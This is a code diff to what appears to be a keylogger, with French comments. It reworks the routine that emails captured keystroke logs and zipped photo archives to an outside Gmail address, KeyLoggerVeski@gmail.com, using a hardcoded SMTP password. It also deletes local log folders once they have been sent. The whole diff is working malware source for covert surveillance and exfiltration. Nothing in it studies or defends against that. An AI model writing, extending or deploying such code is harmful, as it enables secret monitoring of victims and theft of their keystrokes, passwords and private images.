@@ -19,6 +19,7 @@ username = os.getlogin()
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
+from email.mime.application import MIMEApplication
 from email.mime.base import MIMEBase
 from email import encoders
 
@@ -33,27 +34,36 @@ def email_alert(subject,body,to, liste_file=""):
     password = "sslezqomykvdhggd"
     
     msg.attach(MIMEText(body,'plain'))
-    
+    ok = True
     for filename in liste_file:
         if os.path.exists(filename):
-            attachment = open(filename,"rb")
-            part = MIMEBase('application','octet-stream')
-            part.set_payload((attachment).read())
-            encoders.encode_base64(part)
-            part.add_header('Content-Disposition','attachment; filename=' + filename)
-            msg.attach(part)
+            if filename[-4:] != ".zip":
+                attachment = open(filename,"rb")
+                part = MIMEBase('application','octet-stream')
+                part.set_payload((attachment).read())
+                encoders.encode_base64(part)
+                part.add_header('Content-Disposition','attachment; filename=' + filename)
+                msg.attach(part)
+            else: #si fichier zip
+                with open(filename,'rb') as f:
+				 # Attach the file with filename to the email
+                     msg.attach(MIMEApplication(f.read(), Name=filename.split('/')[-1]))
         else:
+            ok = False
             print(filename + " : file not exist")
         
         
+    if ok:
+        server = smtplib.SMTP("smtp.gmail.com",587)
+        server.starttls()
+        server.login(user,password)
+        server.send_message(msg)
     
-    server = smtplib.SMTP("smtp.gmail.com",587)
-    server.starttls()
-    server.login(user,password)
-    server.send_message(msg)
-    
-    print("###" + subject + " ok the mail send to KeyLoggerVeski@gmail.com")
+        print("--> ###" + subject + " ok the mail send to KeyLoggerVeski@gmail.com")
+    else:
+        print("- ! ###" + subject + " ! not send to KeyLoggerVeski@gmail.com")
     server.quit()
+    return ok
 
 def send_log_dossier(dateee):
 	global dateheure
@@ -65,30 +75,35 @@ def send_log_dossier(dateee):
 		if not os.path.exists(dossierhier +"/ok_sent.txt"): # si dans le dossier n'a pas été envoyé
 			listefichiers = [f"{dossierhier}/{nomfile_hier}"] #le fichier log à envoyé
 			
-			colis = AR1 + "/" + datee + ".zip"		#l'archive de photo à envoyé
+			colis = AR1 + "/" + dateee + ".zip"		#l'archive de photo à envoyé
 			if os.path.exists(colis):
-				print(colis)
+				print("colis",colis)
 				listefichiers.append(colis)
-			email_alert(nomfile_hier,"yes","KeyLoggerVeski@gmail.com",listefichiers)
+			try:
+				ok = email_alert(nomfile_hier,"yes","KeyLoggerVeski@gmail.com",listefichiers)
+			except:
+				ok = False
+				print(listefichiers, "n'a pas été envoyé, erreur d'essai")
 			
 			#ok c'est fait, c'est noté
-			fichierok = open(dossierhier+"/ok_sent.txt", "a")
-			fichierok.write(f"{dossierhier}/{nomfile_hier} file sent at {dateheure},to KeyLoggerVeski@gmail.com \n")
-			fichierok.close()
-			print("## " + dossierhier+"/ok_sent.txt")
+			if ok:
+				fichierok = open(dossierhier+"/ok_sent.txt", "a") # ajouter un fichier ok_sent dans le dossier
+				fichierok.write(f"{dossierhier}/{nomfile_hier} file sent at {dateheure},to KeyLoggerVeski@gmail.com \n")
+				fichierok.close()
+				print("## " + dossierhier+"/ok_sent.txt")
 		else:
 			print(" * " + nomfile_hier + " DEJA ENVOYER CHKAL")
 			
 def main_email():
 	
-	print(os.listdir(NOM_DOSSIER_SECRET))
+	
 	for dos in os.listdir(NOM_DOSSIER_SECRET): #pour tous les dossier du data
 		if dos != dateajd and os.path.isdir(NOM_DOSSIER_SECRET + "/"+dos):
 			send_log_dossier(dos)
-			#print(f" *** SEND *** {dos}")
+			
 		else:
-			print(f" * dont sent parce que c'est le dossier de ajd {dos}")				
-
+			print(f" ! {dos} pas envoyé")				
+	print("*fin main_mail*")
 ###########################################################
      ################### DELETE ######################
 ###########################################################
@@ -128,23 +143,26 @@ def get_file_or_folder_age(path):
 	# returning the time
 	return ctime
 
-def main_delete():
+def main_delete(maximum):
 	global NOM_DOSSIER_SECRET
 	listeDossiersDates = [fic for fic in os.listdir(NOM_DOSSIER_SECRET)]
 	listeDossiersDates.sort()
 	print(listeDossiersDates)
 	listeDossiersSupprimer = []
 	n = len(listeDossiersDates)
-	while n > 3:
+	cpt = 0
+	while n > maximum and cpt < n:
 		dossierasuppr = NOM_DOSSIER_SECRET +"/"+ listeDossiersDates[0]
-		if os.path.exists(dossierasuppr):
+		if os.path.exists(dossierasuppr) and os.path.exists(dossierasuppr +"/ok_sent.txt"):
 			remove_folder(dossierasuppr)
 			listeDossiersSupprimer.append(dossierasuppr)
 		listeDossiersDates = listeDossiersDates[1:]
 		n = len(listeDossiersDates)
+		cpt += 1
 	print(" Dossier supprimer",listeDossiersSupprimer)
+	print(" compteur affiche ",cpt)
 
-def main_delete_ar1():
+def main_delete_ar1(maximum):
 	global AR1
 	print(AR1)
 	listeDossiersDates = [fic for fic in os.listdir(AR1)]
@@ -152,7 +170,7 @@ def main_delete_ar1():
 	print(listeDossiersDates)
 	listeDossiersSupprimer = []
 	n = len(listeDossiersDates)
-	while n > 3:
+	while n > maximum:
 		dossierasuppr = AR1 +"/"+ listeDossiersDates[0]
 		if os.path.exists(dossierasuppr):
 			remove_folder(dossierasuppr)
@@ -226,23 +244,24 @@ except:
 main_archive()
 ############################################################################## MAIN
 '''
+'''
 try:
-	main_delete()
+	
+	print(" ----------------------------------------> Yes main_email")
+except:
+	print(" ----------------------------------------! ERREUR de main_email")
+'''
+main_email()
+try:
+	main_delete(3)
 	print(" ----------------------------------------> Yes main_delete")
 except:
 	print(" ----------------------------------------! ERREUR de main_delete")
 try:
-	main_delete_ar1()
+	main_delete_ar1(20)
 	print(" ----------------------------------------> Yes main_delete_ar1")
 except:
 	print(" ----------------------------------------! ERREUR de main_delete_ar1")
-
-
-try:
-	main_email()
-	print(" ----------------------------------------> Yes main_email")
-except:
-	print(" ----------------------------------------! ERREUR de main_email")
 
 
 
